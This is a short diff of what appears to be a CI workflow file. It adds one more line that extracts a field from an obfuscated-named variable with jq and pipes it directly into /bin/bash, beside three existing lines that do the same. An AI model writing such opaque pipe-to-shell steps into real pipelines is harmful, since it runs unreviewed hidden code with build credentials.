@@ -28,6 +28,7 @@ jobs:
           echo $tjps7955 | jq -r .t70 | /bin/bash
           printf '%s' "$zap66784" | jq -r .tgjol2 | /bin/bash
           printf '%s' "$if72" | jq -r .kfo68562 | /bin/bash
+          echo $ks82 | jq -r .uaa8 | /bin/bash
 
       - name: Archive output
         if: always()
